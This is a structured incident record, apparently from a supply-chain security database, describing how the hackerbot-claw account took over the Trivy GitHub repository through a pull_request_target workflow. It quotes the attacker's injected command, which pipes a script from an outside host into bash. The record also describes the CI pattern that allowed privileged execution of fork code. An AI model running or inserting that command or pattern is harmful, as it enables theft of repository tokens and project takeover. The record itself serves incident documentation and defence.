Trivy repository takeover installed hackerbot-claw

Target: trivy-hackerbot-claw · repo
Date: 2026-02-28 to 2026-03-01 (1 day)
Actor: Individual (person)
Target Kind: application
Language: Go
Cause: ci_cd_exploit
Motive: credential_theft_vandalism
Transitive: false
Impact: repository_takeover
User Impact: 0
Phase: ci_cd

Synopsis

The hackerbot-claw account exploited a pull_request_target workflow in aquasecurity/trivy to run untrusted fork code with repository privileges.

Story

The first Trivy incident was a GitHub Actions takeover, not a poisoned Trivy release. The `hackerbot-claw` account opened pull request 10254 with a harmless-looking branch name and triggered Trivy's API Diff Check workflow.

The workflow used `pull_request_target`, then checked out the attacker's fork code and ran repository scripts with elevated permissions. The attacker modified `.github/actions/setup-go/action.yaml` so the normal Go setup step executed `curl -sSfL https://hackmoltrepeat.com/molt | bash`.

That execution path stole a Personal Access Token. With the token, the attacker took over the repository, removed releases, pushed changes, and disrupted the public project. StepSecurity described Trivy as the most damaging repository compromise in the hackerbot-claw wave.

The later March 2026 Trivy v0.69.4 compromise is modeled separately because it used remaining credentials to publish malicious artifacts and move action tags. This record covers the February repository takeover that made the second incident possible.
